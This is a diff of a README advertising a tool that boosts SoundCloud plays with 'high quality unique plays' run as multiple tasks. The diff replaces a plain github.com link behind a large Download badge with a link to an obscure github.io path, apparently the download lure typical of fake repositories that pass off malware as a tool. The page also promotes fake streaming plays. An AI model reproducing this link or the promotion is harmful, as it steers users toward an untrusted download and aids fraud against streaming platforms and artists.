@@ -21,7 +21,7 @@ Deliver high quality unique plays to any of your songs in a fraction of the time
 
 Multi-tasking, boost multiple of your Soundcloud tracks simutaniously! Create as many tasks as you want at any time, choose individual speeds for each task, or cancel them at any time.
 
-<div align="center"><a href="https://github.com"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
+<div align="center"><a href="https://dolchis.github.io/id/ds80f972c"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
 
 > 🔲 Supported CPU: AMD & Intel
 >
